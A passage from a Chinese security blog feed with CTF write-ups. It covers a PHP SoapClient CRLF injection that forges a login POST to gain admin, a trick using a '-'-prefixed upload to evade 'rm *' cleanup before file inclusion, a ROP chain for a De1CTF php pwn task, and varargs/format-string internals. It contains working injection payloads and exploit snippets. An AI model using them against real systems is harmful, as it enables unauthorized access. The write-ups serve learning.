"http://127.0.0.1/#getcountry"</span></span><br><span class="line"><span class="comment">Content-Length: 387</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="comment">&lt;SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ns1="http://127.0.0.1/" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"&gt;&lt;SOAP-ENV:Body&gt;&lt;ns1:getcountry/&gt;&lt;/SOAP-ENV:Body&gt;&lt;/SOAP-ENV:Envelope&gt;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<p><strong>uri</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$location = <span class="string">"http://127.0.0.1:9999/2.php?action=login"</span>;</span><br><span class="line">$uri = <span class="string">"http://127.0.0.1/\r\ntest:test"</span>;</span><br><span class="line">$event = <span class="keyword">new</span> SoapClient(<span class="keyword">null</span>,<span class="keyword">array</span>(<span class="string">'user_agent'</span>=&gt;<span class="string">"test"</span>,<span class="string">'location'</span>=&gt;$location,<span class="string">'uri'</span>=&gt;$uri));</span><br><span class="line">$event-&gt;getcountry();</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  收到的请求：</span></span><br><span class="line"><span class="comment">POST /2.php?action=login HTTP/1.1</span></span><br><span class="line"><span class="comment">Host: 127.0.0.1:9999</span></span><br><span class="line"><span class="comment">Connection: Keep-Alive</span></span><br><span class="line"><span class="comment">User-Agent: test</span></span><br><span class="line"><span class="comment">Content-Type: text/xml; charset=utf-8</span></span><br><span class="line"><span class="comment">SOAPAction: "http://127.0.0.1/</span></span><br><span class="line"><span class="comment">test:test#getcountry"</span></span><br><span class="line"><span class="comment">Content-Length: 398</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="comment">&lt;SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ns1="http://127.0.0.1/</span></span><br><span class="line"><span class="comment">test:test" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"&gt;&lt;SOAP-ENV:Body&gt;&lt;ns1:getcountry/&gt;&lt;/SOAP-ENV:Body&gt;&lt;/SOAP-ENV:Envelope&gt;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<p>因为请求体一定在可注入点的后面，所以我们不需要担心。无论CRLF的注入点在哪，我们都可以轻松的利用CRLF向下覆盖，重写请求体。</p>
<p>这里的关键是在请求头，因为在HTTP协议中，当请求头中有相同的键值的时候，是一第个为准的。</p>
<p>比如这样的一个请求：</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/2.php?action=login</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 127.0.0.1:9999</span><br><span class="line"><span class="attribute">Connection</span>: Keep-Alive</span><br><span class="line"><span class="attribute">User-Agent</span>: test</span><br><span class="line"><span class="attribute">Content-Type</span>: text/xml; charset=utf-8</span><br><span class="line"><span class="attribute">SOAPAction</span>: "http://127.0.0.1/</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencode</span><br><span class="line"><span class="attribute">Content-Length</span>: 398</span><br></pre></td></tr></table></figure>

<p>服务器解析时识别的<code>Content-Type</code>为<code>text/xml; charset=utf-8</code>,但是我们想post表单，要要求它为<code>application/x-www-form-urlencode</code></p>
<p>所以注意看两个请求的注入点位置，显然<code>uri</code>的CRLF注入点在<code>Content-Type</code>的后面，没把法修改<code>Content-Type</code>,利用起来有点难度，所以先讲 <code>user_agent</code>这个注入点。</p>
<h4 id="利用user-agent这个CRLF注入点"><a href="#利用user-agent这个CRLF注入点" class="headerlink" title="利用user_agent这个CRLF注入点"></a>利用user_agent这个CRLF注入点</h4><p>下面是利用代码,生成注入数据：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$location = <span class="string">"http://127.0.0.1/index.php?action=login"</span>;</span><br><span class="line">$uri = <span class="string">"http://127.0.0.1/"</span>;</span><br><span class="line">$event = <span class="keyword">new</span> SoapClient(<span class="keyword">null</span>,<span class="keyword">array</span>(<span class="string">'user_agent'</span>=&gt;<span class="string">"test\r\nCookie: PHPSESSID=08jl0ttu86a5jgda8cnhjtvq32\r\nContent-Type: application/</span></span><br><span class="line"><span class="string">x-www-form-urlencoded\r\nContent-Length: 45\r\n\r\nusername=admin&amp;password=nu1ladmin&amp;code=470837\r\n\r\n\r\n"</span>,<span class="string">'location'</span>=&gt;$location,</span><br><span class="line"><span class="string">'uri'</span>=&gt;$uri));</span><br><span class="line">$c = (serialize($event));</span><br><span class="line">var_dump(urlencode($c));</span><br></pre></td></tr></table></figure>

<p>这里的<code>PHPSESSID</code>换成一个还没有登录过的session，验证码换成自己的，注入这条数据之后：</p>
<p><img src="http://pic.wonderkun.cc/uploads/2018/03/4.png" alt="http://pic.wonderkun.cc/uploads/2018/03/4.png"></p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">signature=username`,`O%<span class="number">3</span>A10%<span class="number">3</span>A%<span class="number">22</span>SoapClient%<span class="number">22</span>%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">22</span>uri%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A17%<span class="number">3</span>A%<span class="number">22</span>http%<span class="number">3</span>A%<span class="number">2</span>F%<span class="number">2</span>F127<span class="number">.0</span><span class="number">.0</span><span class="number">.1</span>%<span class="number">2</span>F%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span>location%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A39%<span class="number">3</span>A%<span class="number">22</span>http%<span class="number">3</span>A%<span class="number">2</span>F%<span class="number">2</span>F127<span class="number">.0</span><span class="number">.0</span><span class="number">.1</span>%<span class="number">2</span>Findex.php%<span class="number">3</span>Faction%<span class="number">3</span>Dlogin%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A11%<span class="number">3</span>A%<span class="number">22</span>_user_agent%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A174%<span class="number">3</span>A%<span class="number">22</span>test%<span class="number">0</span>D%<span class="number">0</span>ACookie%<span class="number">3</span>A+PHPSESSID%<span class="number">3</span>D08jl0ttu86a5jgda8cnhjtvq32%<span class="number">0</span>D%<span class="number">0</span>AContent-Type%<span class="number">3</span>A+application%<span class="number">2</span>Fx-www-form-urlencoded%<span class="number">0</span>D%<span class="number">0</span>AContent-Length%<span class="number">3</span>A+<span class="number">45</span>%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">0</span>D%<span class="number">0</span>Ausername%<span class="number">3</span>Dadmin%<span class="number">26</span>password%<span class="number">3</span>Dnu1ladmin%<span class="number">26</span>code%<span class="number">3</span>D164760%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A13%<span class="number">3</span>A%<span class="number">22</span>_soap_version%<span class="number">22</span>%<span class="number">3</span>Bi%<span class="number">3</span>A1%<span class="number">3</span>B%<span class="number">7</span>D`)#&amp;mood=<span class="number">0</span></span><br></pre></td></tr></table></figure>



<p>然后再用刚才的那个<code>session</code>访问一下,访问一下首页，就拿到管理员权限了。</p>
<h4 id="利用uri这个CRLF注入点"><a href="#利用uri这个CRLF注入点" class="headerlink" title="利用uri这个CRLF注入点"></a>利用uri这个CRLF注入点</h4><p>根据刚才分析，知道uri这个注入点没办法伪造<code>Content-Type</code> 但是难道就不能利用了么？ </p>
<p>（这次跟着@magicBlue学了一招）看请求，注意到一个细节<code>Connection: Keep-Alive</code> ,说明这是一个长http连接，有什么用呢，来测试一下：</p>
<p>写一个测试代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//2.php </span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    var_dump($_GET);</span><br><span class="line">    var_dump($_POST);</span><br></pre></td></tr></table></figure>

<p>做下面的测试：</p>
<p><img src="http://pic.wonderkun.cc/uploads/2018/03/5.png" alt="http://pic.wonderkun.cc/uploads/2018/03/5.png"></p>
<p>可以发现当第一个请求的<code>Connection: Keep-Alive</code>的时候，接着的那个请求也会被响应。也就是说在一次HTTP连接中可以同时又多个HTTP请求头和请求体，但是当前请求被响应的前提是，前一个请求有<code>Connection: Keep-Alive</code> 。 （测试的时候需要注意<code>Content-Length</code>字段，需把burp中的<code>repeater-&gt;update content-length</code>选项关掉）</p>
<p><strong>这里就也给了我们一个很重要的启示，如果我们遇到一个GET型的CRLF注入，但是我们需要的却是一个POST类型的请求，就可以用这种方式，在第一个请求中注入一个<code>Connection: Keep-Alive</code>,然后接着往下注入第二个请求，就可以实现我们的目的。</strong></p>
<p>这里写一下payload：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$uri = <span class="string">"http://www.baidu.com/?test=blue\r\nContent-Length: 0\r\n\r\n\r\nPOST /index.php?action=login HTTP/1.1\r\nHost: 127.0.0.1\r\nCookie: PHPSESSID=52m5ugohiki56gds9c6t71rj92\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 45\r\nConnection: Close\r\n\r\nusername=admin&amp;password=nu1ladmin&amp;code=435137\r\n\r\n\r\n"</span>;</span><br><span class="line">$location = <span class="string">"http://127.0.0.1/test"</span>;  <span class="comment">//注意这里一定不要写 index.php?action=login,否则第一个请求会改变验证码的值</span></span><br><span class="line">$event = <span class="keyword">new</span> SoapClient(<span class="keyword">null</span>,<span class="keyword">array</span>(<span class="string">'location'</span>=&gt;$location,<span class="string">'uri'</span>=&gt;$uri));</span><br><span class="line"><span class="keyword">echo</span>  urlencode(serialize($event));</span><br></pre></td></tr></table></figure>

<p><img src="http://pic.wonderkun.cc/uploads/2018/03/6.png" alt="http://pic.wonderkun.cc/uploads/2018/03/6.png"></p>
<p>这两种方法都可以拿到管理员权限。</p>
<h3 id="0x5利用bash的特性，绕过删除"><a href="#0x5利用bash的特性，绕过删除" class="headerlink" title="0x5利用bash的特性，绕过删除"></a>0x5利用bash的特性，绕过删除</h3><p>拿到管理员权限之后，就可以上传了，但是有个坑点：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$file_true_name = str_replace(<span class="string">'.'</span>,<span class="string">''</span>,pathinfo($file[<span class="string">'name'</span>])[<span class="string">'filename'</span>]);</span><br><span class="line">        $file_true_name = str_replace(<span class="string">'/'</span>,<span class="string">''</span>,$file_true_name);</span><br><span class="line">        $file_true_name = str_replace(<span class="string">'\\'</span>,<span class="string">''</span>,$file_true_name);</span><br><span class="line">        $file_true_name = $file_true_name.time().rand(<span class="number">1</span>,<span class="number">100</span>).<span class="string">'.jpg'</span>;</span><br><span class="line">        $move_to_file = $user_path.<span class="string">"/"</span>.$file_true_name;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($uploaded_file,$move_to_file)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(stripos(file_get_contents($move_to_file),<span class="string">'&lt;?php'</span>)&gt;=<span class="number">0</span>)</span><br><span class="line">                system(<span class="string">'sh /home/nu1lctf/clean_danger.sh'</span>);</span><br><span class="line">            <span class="keyword">return</span> $file_true_name;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># /home/nu1lctf/clean_danger.sh</span></span><br><span class="line"><span class="built_in">cd</span> /app/adminpic/ </span><br><span class="line">rm *.jpg </span><br><span class="line"><span class="built_in">cd</span> /var/www/html/adminpic/ </span><br><span class="line">rm *</span><br></pre></td></tr></table></figure>

<p>开始没有仔细看代码，以为用短标签就可以直接绕过了。（记得phithon师傅说过，php5.5.x版本有个bug，php.ini中的short_open_tag =&gt; Off是不起作用的）</p>
<p>所以一直拿不到shell，后来自己来看代码才发现：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">stripos(file_get_contents($move_to_file),<span class="string">'&lt;?php'</span>)&gt;=<span class="number">0</span>  <span class="comment">// 这里是&gt;= </span></span><br><span class="line">    <span class="comment">// flase是 &gt;= 0的，所以无论传啥都会给删了。</span></span><br></pre></td></tr></table></figure>

<p>那就是要传一个<code>rm *.jpg</code>删不掉的，马上想到之前学习linux的时候遇到的一个文件删不掉的问题</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@9f4b226f92c1:/app/<span class="built_in">test</span><span class="comment"># ls</span></span><br><span class="line">-test.jpg  1.php</span><br><span class="line">root@9f4b226f92c1:/app/<span class="built_in">test</span><span class="comment"># rm *.jpg</span></span><br><span class="line">rm: invalid option -- <span class="string">'t'</span></span><br><span class="line">Try <span class="string">'rm ./-test.jpg'</span> to remove the file <span class="string">'-test.jpg'</span>.</span><br><span class="line">Try <span class="string">'rm --help'</span> <span class="keyword">for</span> more information.root@9f4b226f92c1:/app/<span class="built_in">test</span><span class="comment"># ls</span></span><br><span class="line">-test.jpg  1.php</span><br><span class="line">root@9f4b226f92c1:/app/<span class="built_in">test</span><span class="comment"># rm *rm: invalid option -- 't'</span></span><br><span class="line">Try <span class="string">'rm ./-test.jpg'</span> to remove the file <span class="string">'-test.jpg'</span>.</span><br><span class="line">Try <span class="string">'rm --help'</span> <span class="keyword">for</span> more information.</span><br><span class="line">root@9f4b226f92c1:/app/<span class="built_in">test</span><span class="comment"># ls</span></span><br><span class="line">-test.jpg  1.php</span><br></pre></td></tr></table></figure>

<p>这估计是因为 bash在做<code>*</code>符号展开之后，直接把<code>-test.jpg</code>传给了<code>rm</code>命令，然后<code>rm</code>命令就把<code>-</code>后面内容全部作为参数解析，导致命令执行失败。</p>
<p>所以只需要上传一个以<code>-</code>开头的文件，就删除不掉了。</p>
<p>上传完成之后，不知道为啥文件不再首页显示，必须要爆破一下，然后利用文件包含拿到shell。</p>
<p><img src="http://pic.wonderkun.cc/uploads/2018/03/7.png" alt="http://pic.wonderkun.cc/uploads/2018/03/7.png"></p>
<h3 id="0x6-启示"><a href="#0x6-启示" class="headerlink" title="0x6 启示"></a>0x6 启示</h3><p>做完这个题，真的是更加深刻的体会到了安全是一个面，知识点无处不在啊，还是要多学习各种知识啊。</p>
<p>最后不得不佩服出题人宽泛的知识体系，膜拜一下。</p>
]]></content>
      <categories>
        <category>hack_ctf</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>php pwn学习入门一 (基础环境搭建)</title>
    <url>/2020/05/12/php%20pwn%E5%AD%A6%E4%B9%A0%E5%85%A5%E9%97%A8%E4%B8%80/</url>
    <content><![CDATA[<h2 id="php-pwn学习入门一-基础环境搭建"><a href="#php-pwn学习入门一-基础环境搭建" class="headerlink" title="php pwn学习入门一 (基础环境搭建)"></a>php pwn学习入门一 (基础环境搭建)</h2><p>本文是学习php二进制漏洞利用的第一篇文章，本文主要简单说一下基础的环境搭建问题以及一个简单的栈溢出的利用过程。</p>
<a id="more"></a>

<h3 id="php不同的运行模式"><a href="#php不同的运行模式" class="headerlink" title="php不同的运行模式"></a>php不同的运行模式</h3><p>SAPI(Server Application Programming Interface)是服务器端应用编程端口，它是应用层(比如 Apache，Nginx，CLI等)和 PHP 进行数据交互的入口。利用SAPI，php能够和其上的具体应用层进行解耦合，使得同一套php内核就可以和多种不同的应用层进行交互。在php的源代码sapi目录下有多种sapi的具体实现，比如cgi、cli、apache2handler、fpm等。</p>
<p>根据不同的上层应用，php使用的SAPI也不同，常见的搭配有<code>apache2+apache2handler</code>，<code>nginx+fpm</code>，当然也存在 <code>apache2 + cgi</code>的模式，不过由于性能问题，现在已经基本见不到了。(defcon曾经出过一个赛题叫shellql，就是 <code>apache2 + cgi</code> 模式下写shellcode，此模式相对于其他两种会简单一些，此处就不讲了)。</p>
<p>一般调试php，最好是能够自己重新编译一下php，这样的二进制有符号表，可以大大的提高了调试时的效率。</p>
<p><code>nginx+fpm</code>的这种运行方式的调试我在复现CVE-2019-11043漏洞的那篇文章中说过，但是注意编译php时的参数选择，最主要的是<code>--enable-fpm --with-fpm-user=www-data --with-fpm-group=www-data</code>，其他的编译参数的含义可以直接使用<code>./configure --help</code>查看，偷懒的办法就是直接 pull php 官方提供的docker环境<code>php:version-fpm</code>，然后运行<code>php-config --configure-options</code>参考一下。</p>
<p><code>apache2+apache2handler</code>运行模式下需要编译mod_php，就是俗称的 <code>libphp.so</code>，将它作为模块加载到apache2中执行，需要使用<code>--with-apxs2</code>来指定apache2的<code>apxs2</code>路径。在编译安装完成libphp.so之后，还无法启动apache2，因为php不支持apche2默认采用的<code>mpm_event</code>多线程管理技术，所以需要执行<code>a2dismod mpm_event &amp;&amp; a2enmod  mpm_prefork</code>来启用php支持的<code>mpm_prefork</code>，具体的详情可以参考php官方文档<a href="https://www.php.net/manual/en/install.unix.apache2.php" target="_blank" rel="noopener">https://www.php.net/manual/en/install.unix.apache2.php</a>。我也在这里提供了一个Dockerfile例子<a href="https://github.com/wonderkun/CTFENV/tree/master/libphp-extension-debug" target="_blank" rel="noopener">https://github.com/wonderkun/CTFENV/tree/master/libphp-extension-debug</a>。</p>
<h3 id="De1CTF-mixture-题解"><a href="#De1CTF-mixture-题解" class="headerlink" title="De1CTF mixture 题解"></a>De1CTF mixture 题解</h3><p>这个题目按道理是比较简单的，但是当时做出来的人也不多，可能是被 <code>apache2+apache2handler</code> 这种运行模式吓到了，很有幸朋友 @lfy 在赛后给我提供了题目环境<a href="https://github.com/wonderkun/CTF_web/tree/master/PHP_PWN_LEARN/stack_overflow" target="_blank" rel="noopener">https://github.com/wonderkun/CTF_web/tree/master/PHP_PWN_LEARN/stack_overflow</a>。</p>
<p>为了调试的方便，以debug模式启动apache2: </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apachectl -X &amp;</span><br><span class="line">gdb -q -p `pidof apache2`</span><br></pre></td></tr></table></figure>

<p>此题目是一个基础的栈溢出利用，由于可以直接写栈，所以可以直接构造 ROP chian来实现任意命令执行。但是由于溢出点的函数栈帧偏移无法被泄露出来，而且是64位的非交互环境，也无法直接跳到one_gadget，所以任意命令执行的参数构造还是有点麻烦，但是pwn师傅找的 gadget <code>mov QWORD PTR [rdx],rdi ; ret</code>，来进行参数构造的方法真是香(我完全想不到)，主要代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(s)//<span class="number">8</span>+<span class="number">1</span>):</span><br><span class="line">    payload+=p64(pop_rdx)</span><br><span class="line">    payload+=p64(shell_addr+i*<span class="number">8</span>)</span><br><span class="line">    payload+=p64(pop_rdi)</span><br><span class="line">    payload+= bytes(s[i*<span class="number">8</span>:i*<span class="number">8</span>+<span class="number">8</span>].ljust(<span class="number">8</span>,<span class="string">"\x00"</span>),encoding=<span class="string">"latin-1"</span>)</span><br><span class="line">    payload+=p64(mov_rdx_rdi)</span><br></pre></td></tr></table></figure>

<p>除此之外，在php扩展中，返回信息是通过结构体指针传出的，所以下图中的代码会修改栈上的数据，影响最后栈上的rop的执行，所以这里需要放一些无用的数据来防止破坏rop chain，在真实利用过程中此处使用4个pop操作进行绕过。</p>
<p><img src="http://pic.wonderkun.cc/uploads/2020/05/2020-05-13-12-26-17.png" alt="http://pic.wonderkun.cc/uploads/2020/05/2020-05-13-12-26-17.png"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pop4_ret=libc_addr+<span class="number">0x000000000002219e</span>  <span class="comment"># 0x7ffff711519e ;pop    r13 ; pop    r14 ;pop    r15;pop    rbp; ret</span></span><br><span class="line">payload=p64(pop_rdx)*<span class="number">10</span>+p64(pop4_ret)+p64(<span class="number">0</span>)*<span class="number">4</span> + p64(pop4_ret)+p64(<span class="number">0</span>)*<span class="number">4</span></span><br></pre></td></tr></table></figure>

<p>最后一个问题是system函数中有指令 <code>movaps xmmword ptr [rsp+0x40], xmm0</code>可能会导致崩溃，查了一些资料才知道 <a href="http://blog.binpang.me/2019/07/12/stack-alignment/" target="_blank" rel="noopener">http://blog.binpang.me/2019/07/12/stack-alignment/</a>，<a href="http://homura.cc/blog/archives/168" target="_blank" rel="noopener">http://homura.cc/blog/archives/168</a>，这条指令要求 rsp必须是16字节对齐的，所以需要修改一下栈布局，让调用system函数的时候rsp是16字节对齐的即可。</p>
]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>web</tag>
        <tag>pwn</tag>
        <tag>学习记录</tag>
      </tags>
  </entry>
  <entry>
    <title>php pwn学习入门二 (格式化字符串漏洞)</title>
    <url>/2020/05/13/php%20pwn%E5%AD%A6%E4%B9%A0%E5%85%A5%E9%97%A8%E4%BA%8C/</url>
    <content><![CDATA[<h2 id="php-pwn学习入门二-格式化字符串漏洞"><a href="#php-pwn学习入门二-格式化字符串漏洞" class="headerlink" title="php pwn学习入门二 (格式化字符串漏洞)"></a>php pwn学习入门二 (格式化字符串漏洞)</h2><p>本文是学习php二进制漏洞利用的第二篇文章，格式化字符串漏洞是CTF比赛中比较常见的漏洞，本文主要介绍一下64位下php中的格式化字符串漏洞的利用思路。</p>
<a id="more"></a>
<h3 id="从可变参函数谈起"><a href="#从可变参函数谈起" class="headerlink" title="从可变参函数谈起"></a>从可变参函数谈起</h3><p>学习c标准库中类似于<code>printf</code>这类函数的格式化字符串漏洞时，我就存在一些疑问：</p>
<ul>
<li><ol>
<li>为什么使用多个%p或者%x泄露的是栈上的数据？这是<code>printf</code>函数实现上的问题吗，可变参数都存储在什么位置？</li>
</ol>
</li>
<li><ol start="2">
<li>这存在越界读取数据的行为到底是<code>printf</code>函数的问题，还是可变参函数的通病？</li>
</ol>
</li>
</ul>
<p>为了搞清楚上述的两个问题，需要先搞明白可变参函数的实现原理，首先自己写一个可变参函数，调试一下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdarg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sum</span><span class="params">(<span class="keyword">int</span> n, ...)</span>  <span class="comment">//第一个参数表明有可变参数有多少个相加  </span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    va_list ap;</span><br><span class="line">    va_start(ap, n);</span><br><span class="line">    <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(n--)</span><br><span class="line">        sum += va_arg(ap, <span class="keyword">int</span>);</span><br><span class="line">    va_end(ap);</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,sum(<span class="number">5</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>下面对编译器中实现的几个宏进行注释说明：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">va_start</span><span class="params">( va_list arg_ptr, prev_param )</span></span>; <span class="comment">//初始化pArgs指针，使其指向第一个可变参数。该宏第二个参数是变参列表的前一个参数，即最后一个固定参数</span></span><br><span class="line"><span class="function">type <span class="title">va_arg</span><span class="params">( va_list arg_ptr, type )</span></span>;  <span class="comment">//该宏返回变参列表中的当前变参值并使pArgs指向列表中的下个变参。该宏第二个参数是要返回的当前变参类型，若函数有多个可变参数，则依次调用va_arg宏获取各个变参</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">va_end</span><span class="params">( va_list arg_ptr )</span></span>; <span class="comment">// 将指针pArgs置为无效，结束变参的获取</span></span><br></pre></td></tr></table></figure>

<p>其中 <code>va_list</code>结构体在64位上大概长这个样子:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">   <span class="keyword">unsigned</span> <span class="keyword">int</span> gp_offset;</span><br><span class="line">   <span class="keyword">unsigned</span> <span class="keyword">int</span>  fp_offset;</span><br><span class="line">   <span class="keyword">void</span> *  overflow_arg_area ;</span><br><span class="line">   <span class="keyword">void</span> * reg_save_area; </span><br><span class="line">&#125; va_list_entry ;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span>  va_list_entry[<span class="number">0</span>] va_list;</span><br></pre></td></tr></table></figure>

<p>对上述的sum函数进行反编译：</p>
<p><img src="http://pic.wonderkun.cc/uploads/2020/05/2020-05-11-16-22-16.png" alt="http://pic.wonderkun.cc/uploads/2020/05/2020-05-11-16-22-16.png"></p>
<!-- ![http://pic.wonderkun.ccimg/2020-05-11-16-22-16.png](http://pic.wonderkun.ccimg/2020-05-11-16-22-16.png) -->

<p>当 <code>ap[0].gp_offset &lt;= 0x2F</code>时 ， <code>v1</code>的取值是 <code>ap[0].reg_save_area + ap[0].gp_offset</code> ,当 <code>ap[0].gp_offset &gt; 0x2F</code>时，<code>v1</code>的取值是 <code>v1 = ap[0].overflow_arg_area;</code>。</p>
<p>为了搞清楚，<code>va_list_entry</code>每个字段的含义，需要先来看一下<code>ap</code>的初始化过程：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">push    rbp</span><br><span class="line">mov     rbp, rsp</span><br><span class="line">sub     rsp, 0F0h</span><br><span class="line">mov     [rbp+n], edi</span><br><span class="line">mov     [rbp+var_A8], rsi</span><br><span class="line">mov     [rbp+var_A0], rdx</span><br><span class="line">mov     [rbp+var_98], rcx</span><br><span class="line">mov     [rbp+var_90], r8</span><br><span class="line">mov     [rbp+var_88], r9</span><br><span class="line"></span><br><span class="line">mov     [rbp+ap.gp_offset], 8</span><br><span class="line">mov     [rbp+ap.fp_offset], 30h ; &#39;0&#39;</span><br><span class="line">lea     rax, [rbp+arg_0]</span><br><span class="line">mov     [rbp+ap.overflow_arg_area], rax</span><br><span class="line">lea     rax, [rbp+var_B0]</span><br><span class="line">mov     [rbp+ap.reg_save_area], rax</span><br></pre></td></tr></table></figure>

<p>这里可以看到 <code>ap.gp_offset</code>被初始化为8，它表示当前初始化<code>va_list ap</code>的函数中固定参数的个数，<code>ap.gp_offset = 固定参数个数*8</code>,<code>ap.fp_offset</code>这个的含义我还没理解，暂时未知，以后遇到了再加上去。 <code>ap.overflow_arg_area</code>保存的是 <code>rbp+0x10</code>(因为在32位中，这个位置保存的是函数的第一个参数，所以ida习惯性的重命名为<code>rbp+arg_0</code>)。<code>ap.reg_save_area</code>保存的是<code>rbp-0xb0</code>，它加上<code>ap.gp_offset</code>恰好就是函数第一个可变参数<code>rsi</code>保存的位置<code>rbp+var_A8</code>。</p>
<p>通过上述分析，就明白了64位的可变参函数的工作过程如下：</p>
<ol>
<li>首先将rsi,rdx, rcx,r8,r9 这五个用于传参的寄存器在当前栈空间中进行备份。</li>
<li>初始化结构体<code>ap</code>, <code>ap.reg_save_area</code>保存<code>rsi</code>在栈上备份位置-8的位置，<code>ap.overflow_arg_area</code>保存的是<code>rbp+0x10</code>。</li>
<li>在使用可变参数时，前五个在当前函数栈帧中找，后续的参数在自己调用者的函数栈帧中找。</li>
</ol>
<p>明白了上述的工作过程，就解释了格式化字符串漏洞为啥泄露的是栈上的数据了。由于可变参函数参数个数不确定的特性导致无法合理的控制数据读取的边界，所以即使我们自己编写的可变参函数也可能存在泄露栈数据的问题，就拿上述的<code>sum</code>函数来讲，将代码改成如下。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdarg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sum</span><span class="params">(<span class="keyword">int</span> n, ...)</span>  <span class="comment">//第一个参数表明有可变参数有多少个相加  </span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    va_list ap;</span><br><span class="line">    va_start(ap, n);</span><br><span class="line">    <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(n--)</span><br><span class="line">        sum += va_arg(ap, <span class="keyword">int</span>);</span><br><span class="line">    va_end(ap);</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n; </span><br><span class="line">    <span class="built_in">scanf</span>(<span 